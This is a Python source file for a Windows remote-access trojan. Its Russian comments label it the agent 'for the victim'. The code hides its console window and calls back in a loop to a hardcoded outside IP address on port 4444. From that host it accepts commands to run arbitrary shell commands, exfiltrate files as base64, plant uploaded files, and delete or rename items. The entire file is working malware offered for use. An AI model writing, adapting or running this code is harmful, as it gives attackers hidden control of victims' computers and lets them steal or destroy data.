# agent.py – для жертвы, IP: 78.154.166.209
import socket
import subprocess
import os
import sys
import time
import base64
import ctypes

HOST = '78.154.166.209'   # ваш IP
PORT = 4444

def list_dir(path):
    if not path:
        path = '.'
    if not os.path.exists(path):
        return f'[!] Нет пути: {path}'
    if os.path.isfile(path):
        return f'[!] Это файл: {path}'
    res = []
    for item in os.listdir(path):
        full = os.path.join(path, item)
        if os.path.isdir(full):
            res.append(f'[DIR] {item}')
        else:
            res.append(f'[FILE] {item} ({os.path.getsize(full)} байт)')
    return '\n'.join(res)

def download_file(remote_path):
    if not os.path.exists(remote_path):
        return b''
    with open(remote_path, 'rb') as f:
        return base64.b64encode(f.read())

def upload_file(b64_data, remote_path):
    try:
        data = base64.b64decode(b64_data)
        with open(remote_path, 'wb') as f:
            f.write(data)
        return '[+] Загружено'
    except Exception as e:
        return f'[!] Ошибка: {e}'

def delete_item(path):
    if not os.path.exists(path):
        return '[!] Не существует'
    try:
        if os.path.isdir(path):
            os.rmdir(path)
        else:
            os.remove(path)
        return '[+] Удалено'
    except Exception as e:
        return f'[!] {e}'

def rename_item(old, new):
    if not os.path.exists(old):
        return '[!] Не существует'
    try:
        os.rename(old, new)
        return '[+] Переименовано'
    except Exception as e:
        return f'[!] {e}'

def execute_cmd(cmd):
    try:
        p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        out, err = p.communicate(timeout=30)
        return out + err
    except Exception as e:
        return str(e).encode()

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            return s
        except:
            time.sleep(5)

def main():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    while True:
        s = connect()
        try:
            while True:
                data = s.recv(4096).decode('cp866')
                if not data:
                    break
                parts = data.split('|')
                cmd = parts[0].lower()
                if cmd == 'exit':
                    s.close()
                    sys.exit(0)
                elif cmd == 'listdir' and len(parts) > 1:
                    resp = list_dir(parts[1])
                    s.send(resp.encode('cp866'))
                elif cmd == 'download' and len(parts) > 1:
                    resp = download_file(parts[1])
                    s.send(resp + b'END')
                elif cmd == 'upload' and len(parts) > 2:
                    resp = upload_file(parts[1], parts[2])
                    s.send(resp.encode('cp866'))
                elif cmd == 'delete' and len(parts) > 1:
                    resp = delete_item(parts[1])
                    s.send(resp.encode('cp866'))
                elif cmd == 'rename' and len(parts) > 2:
                    resp = rename_item(parts[1], parts[2])
                    s.send(resp.encode('cp866'))
                else:
                    out = execute_cmd(data)
                    s.send(out)
        except:
            s.close()
            time.sleep(3)

if __name__ == '__main__':
    main()